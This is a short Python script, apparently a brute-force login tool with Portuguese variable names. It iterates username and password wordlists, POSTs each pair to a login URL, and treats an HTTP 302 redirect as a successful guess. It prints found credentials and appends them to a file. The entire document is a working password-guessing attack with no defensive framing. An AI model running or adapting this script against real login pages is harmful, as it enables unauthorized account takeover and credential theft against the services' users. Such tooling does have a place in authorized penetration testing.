#BF

import requests
import os

url = ""

users = open("txt/wordlists/username.txt", 'r')
password = open ("txt/wordlists/password.txt", 'r')
    
for user in users:
    user = user.strip()
    for senha in password:
        senha = senha.strip()

        dados = {
            "username": user,
            "password": senha
        }

        resposta = requests.post(url, data = dados, allow_redirects = False)

        if resposta.status_code == 302 or resposta.is_redirect:
            print(f"Credenciais encontradas: {user}: {senha}")

            with open ("txt/wordlists/credencial.txt", 'a') as file:
                file.write(f"{url} - {user}: {senha}\n")

            exit()

    password.seek(0)

users.close()
password.close()